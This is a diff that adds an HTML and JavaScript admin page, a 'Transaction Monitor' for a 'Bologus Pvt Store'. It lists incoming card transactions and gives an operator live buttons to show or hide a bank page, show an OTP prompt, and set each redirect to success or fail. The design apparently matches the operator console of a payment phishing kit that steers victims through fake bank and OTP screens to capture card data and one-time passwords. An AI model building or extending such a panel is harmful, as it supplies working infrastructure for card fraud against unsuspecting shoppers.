@@ -1,1 +1,154 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Bologus Pvt Store</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        .transaction-enter { animation: slideIn 0.3s ease-out; }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="container mx-auto px-4 py-8">
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Transaction Monitor</h1>
+        
+        <div class="bg-white rounded-lg shadow overflow-hidden">
+            <div class="px-6 py-4 border-b border-gray-200 bg-gray-50">
+                <h2 class="text-lg font-semibold text-gray-700">Active Transactions</h2>
+            </div>
+            
+            <div id="transactionList" class="divide-y divide-gray-200">
+                <!-- Transactions will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        
+        // Fetch and display transactions
+        async function loadTransactions() {
+            try {
+                const response = await fetch('/api/transactions');
+                const transactions = await response.json();
+                renderTransactions(transactions);
+            } catch (error) {
+                console.error('Error loading transactions:', error);
+            }
+        }
+
+        // Render transactions to DOM
+        function renderTransactions(transactions) {
+            const container = document.getElementById('transactionList');
+            container.innerHTML = '';
+
+            transactions.forEach(transaction => {
+                const transDiv = document.createElement('div');
+                transDiv.className = 'transaction-enter p-4 hover:bg-gray-50';
+                transDiv.innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <div class="flex-1">
+                            <div class="flex items-center space-x-4">
+                                <span class="font-medium text-gray-900">₹${transaction.amount}</span>
+                                <span class="text-sm text-gray-500">${transaction.cardNumber?.slice(-4) || '****'}</span>
+                                <span class="px-2 py-1 text-xs font-medium rounded-full 
+                                    ${transaction.status === 'success' ? 'bg-green-100 text-green-800' : 
+                                      transaction.status === 'failed' ? 'bg-red-100 text-red-800' : 
+                                      'bg-blue-100 text-blue-800'}">
+                                    ${transaction.status}
+                                </span>
+                            </div>
+                            <div class="mt-2 text-sm text-gray-500">
+                                ${new Date(transaction.timestamp).toLocaleString()}
+                            </div>
+                        </div>
+                        <div class="flex space-x-2">
+                            <button data-invoice="${transaction.id}" data-action="showBankpage" 
+                                class="bankpage-btn px-3 py-1 text-sm bg-blue-600 text-white rounded-md hover:bg-blue-700">
+                                ${transaction.bankpageVisible ? 'Hide Bank' : 'Show Bank'}
+                            </button>
+                            <button data-invoice="${transaction.id}" data-action="showOTP" 
+                                class="otp-btn px-3 py-1 text-sm bg-purple-600 text-white rounded-md hover:bg-purple-700">
+                                Show OTP
+                            </button>
+                            <button data-invoice="${transaction.id}" data-action="success" 
+                                class="px-3 py-1 text-sm bg-green-600 text-white rounded-md hover:bg-green-700">
+                                Success
+                            </button>
+                            <button data-invoice="${transaction.id}" data-action="fail" 
+                                class="px-3 py-1 text-sm bg-red-600 text-white rounded-md hover:bg-red-700">
+                                Fail
+                            </button>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(transDiv);
+            });
+
+            // Attach event listeners to new buttons
+            document.querySelectorAll('[data-action]').forEach(button => {
+                button.addEventListener('click', handleAdminAction);
+            });
+        }
+
+        // Handle admin actions
+        async function handleAdminAction(event) {
+            const invoiceId = event.target.dataset.invoice;
+            const action = event.target.dataset.action;
+
+            try {
+                let endpoint = '';
+                switch(action) {
+                    case 'showBankpage':
+                        endpoint = '/api/showBankpage';
+                        break;
+                    case 'hideBankpage':
+                        endpoint = '/api/hideBankpage';
+                        break;
+                    case 'showOTP':
+                        endpoint = '/api/showOTP';
+                        break;
+                    case 'success':
+                        endpoint = '/api/updateRedirectStatus?status=success';
+                        break;
+                    case 'fail':
+                        endpoint = '/api/updateRedirectStatus?status=fail';
+                        break;
+                }
+
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ invoiceId })
+                });
+
+                const result = await response.json();
+                console.log(`${action} result:`, result);
+                
+                // Update UI after action
+                if (action === 'showBankpage' || action === 'hideBankpage') {
+                    loadTransactions(); // Refresh to update button text
+                }
+            } catch (error) {
+                console.error(`${action} error:`, error);
+            }
+        }
+
+        // Socket.io listeners
+        socket.on('transaction_update', () => {
+            loadTransactions();
+        });
+
+        // Initial load
+        loadTransactions();
+        setInterval(loadTransactions, 5000); // Refresh every 5 seconds
+    </script>
+</body>
+</html>
